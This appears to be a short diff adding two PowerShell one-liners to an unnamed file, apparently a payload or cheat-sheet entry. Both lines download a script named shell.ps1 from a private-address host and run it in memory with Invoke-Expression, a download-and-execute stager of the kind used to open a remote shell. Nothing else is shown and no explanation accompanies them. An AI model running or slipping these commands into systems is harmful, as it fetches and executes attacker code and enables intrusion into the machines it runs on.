@@ -1,0 +1,2 @@
+powershell -c iex(new-object net.webclient).downloadstring("http://10.10.14.9/shell.ps1")
+powershell -c iex(iwr http://10.10.14.9/shell.ps1 -UseBasicParsing)
